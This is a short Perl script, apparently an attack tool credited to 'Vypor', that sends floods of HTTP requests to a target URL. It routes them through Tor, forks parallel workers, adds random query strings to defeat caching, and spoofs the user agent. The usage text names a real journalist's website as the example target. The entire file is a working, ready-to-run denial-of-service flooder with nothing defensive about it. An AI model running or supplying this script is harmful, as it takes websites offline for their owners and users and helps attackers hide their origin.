#!/usr/bin/perl
#Needs: LWP::Protocol::socks
#Requires TOR
#http://search.cpan.org/CPAN/authors/id/S/SC/SCR/LWP-Protocol-socks-1.6.tar.gz
#Made by Vypor

use LWP::UserAgent;
use Parallel::ForkManager;

use vars qw( $PROG );
( $PROG = $0 ) =~ s/^.*[\/\\]//;
if ( @ARGV == 0 ) {
        print "Usage: ./$PROG [TARGET] [THREADS] [MAXREQUESTS]\nExample: ./$PROG http://krebsonsecurity.com/ 10000 1000\n**Requires TOR**\nMade by Vypor\n";
    exit;
}

my $max_processes = $ARGV[1];
my $maxreq = $ARGV[2];

my $pm = Parallel::ForkManager->new($max_processes);
my $count = 1;
while ($count <= $maxreq) {
my @chars = ("a".."z", A..Z, 0..9);
my $random = join '', map { @chars[rand @chars] } 1 .. 8;
my $random2 = join '', map { @chars[rand @chars] } 1 .. 8;
$count++;
	my $pid = $pm->start and next;
		my $ua = LWP::UserAgent->new(agent => q{Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; YPC 3.2.0; .NET CLR 1.1.4322)},);
		my $target = "$ARGV[0]?$random=$random2";
		$ua->proxy([qw/ http https /] => 'socks://localhost:9050');
		$ua->cookie_jar({});
		my $rsp = $ua->get($target);
		print "\r Total Requests: $count | Stopping at $maxreq Requests!";
$pm->finish;
}
$pm->wait_all_children;
print "\n";
